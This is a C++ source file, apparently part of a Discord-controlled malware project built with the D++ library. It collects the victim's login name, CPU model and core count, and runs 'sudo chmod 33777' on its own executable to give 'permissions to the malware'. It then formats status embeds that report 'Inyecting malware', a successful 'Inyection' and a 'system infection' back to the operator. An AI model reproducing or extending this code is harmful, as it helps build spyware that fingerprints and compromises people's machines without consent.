#include "handling.h"

struct list_error {
    std::string no_found_cpu;
    std::string wrong_chmod;
};

struct system_specs {
    std::string cpu_model;
    std::string cpu_cores;
    std::string name;
};

list_error handled_err;
system_specs hardware_specs;

dpp::embed disclaimer_warning() {
    dpp::embed disclaimer = dpp::embed()
        .set_color(dpp::colors::yellow)
        .set_footer(dpp::embed_footer()
            .set_text("@ferrnnaando : https://github.com/ferrnnaando")
            .set_icon("https://i.imgur.com/a8TdLHg.jpg")
            )
        ;

    return disclaimer;
}

dpp::embed equal_webhooks() {
    return dpp::embed();
}

dpp::embed making_connection() {
    char* system_username = getlogin();
    hardware_specs.name = std::string(system_username);
    std::ifstream cpu_model("/proc/cpuinfo");
    std::string line_cpu;

    if(!cpu_model) {
        handled_err.no_found_cpu = "CPU Info wasnt found.";
    } else {
        while(std::getline(cpu_model, line_cpu)) {
            if(line_cpu.find("model name") != std::string::npos) {
                size_t delimiter = line_cpu.find(":");

                if(delimiter != std::string::npos) {
                    std::string cpu_string = line_cpu.substr(delimiter + 2);
                    hardware_specs.cpu_model = cpu_string;
                }
            }
        }
    }

    std::string exec = std::string(program_invocation_short_name);
    int chmod_result = system(("sudo chmod 33777 " + exec).c_str());
    if(chmod_result == 0) {
        //success
    } else {
        handled_err.wrong_chmod = "There was an error giving permissions to the malware.";
    }

    hardware_specs.cpu_cores = std::to_string(std::thread::hardware_concurrency());
    std::string new_device = "```A new device found.```";
    std::string status = "```Loading... (Inyecting malware)```";

    dpp::embed connection = dpp::embed()
        .set_color(dpp::colors::yellow)
        .add_field("<:websit:1140446138177179860> Status", new_device, true)
        .add_field("<:blueshie:1127620004955836416> Process", status, true)
        .set_footer(dpp::embed_footer()
            .set_text("@ferrnnaando : https://github.com/ferrnnaando")
            .set_icon("https://i.imgur.com/a8TdLHg.jpg")
            )
    ;

    return connection;
}

dpp::embed connection_result(bool& result) {
    if(result == false || handled_err.no_found_cpu.empty() || handled_err.wrong_chmod.empty()) {
        std::string formated_error = (!handled_err.no_found_cpu.empty()) ? "```" + handled_err.no_found_cpu + "\n" : "```OK -> cpu info\n"; 
        formated_error += (!handled_err.wrong_chmod.empty()) ? handled_err.wrong_chmod + "```" : "OK -> chmod```";
        std::string result_wrong = "```Inyection was unsuccessful.```";
        dpp::embed wrong = dpp::embed()
            .set_color(dpp::colors::red_blood)
            .add_field("<:websit:1140446138177179860> Status", result_wrong, true)
            .add_field("<:blueshie:1127620004955836416> Output", formated_error, true)
            .set_footer(dpp::embed_footer()
                .set_text("If everything appears as \"OK\" but results on unsuccessful should check the way of how the code is comprobating these and executing the code based on it.")
                .set_icon("https://i.imgur.com/a8TdLHg.jpg")
            )
        ;

        return wrong;
    } else {
        std::string result_success = "```Inyection was sucessful.```";
        std::string output_success = "```No errors.```";
        std::string sys_about = "```System device user: " + hardware_specs.name + "\nSystem:  \nCPU: " + hardware_specs.cpu_model + " || " + hardware_specs.cpu_cores + " cores.\nGPU: ```";

        dpp::embed success = dpp::embed()
            .set_color(dpp::colors::green)
            .add_field("<:websit:1140446138177179860> Status", result_success, true)
            .add_field("<:blueshie:1127620004955836416> Output", output_success, true)
            .add_field("System", sys_about, false)
            .set_footer(dpp::embed_footer()
                .set_text("@ferrnnaando : https://github.com/ferrnnaando")
                .set_icon("https://i.imgur.com/a8TdLHg.jpg")
                )
        ;

        return success;
    }

    return dpp::embed();
}

dpp::embed handle_catch(const std::exception& e) {
    std::string status_error = "```A exception was catched by the try {} catch{} block.```";
    std::string excp = e.what();
    std::string formated_exception = "```" + excp + "```";
    dpp::embed success = dpp::embed()
        .set_color(dpp::colors::green)
        .add_field("<:websit:1140446138177179860> Status", status_error, true)
        .add_field("<:blueshie:1127620004955836416> Output", formated_exception, true)
        ;

        return success;
}

dpp::embed handle_kill() {
    std::string status_error = "```Terminated.```";
    std::string formated_exception = "```The " + hardware_specs.name + " system infection got killed by the system.```";
    dpp::embed success = dpp::embed()
        .set_color(dpp::colors::red)
        .add_field("<:websit:1140446138177179860> Status", status_error, true)
        .add_field("<:blueshie:1127620004955836416> Output", formated_exception, true)
         .set_footer(dpp::embed_footer()
            .set_text("@ferrnnaando : https://github.com/ferrnnaando")
            .set_icon("https://i.imgur.com/a8TdLHg.jpg")
            )
        ;

        return success;
}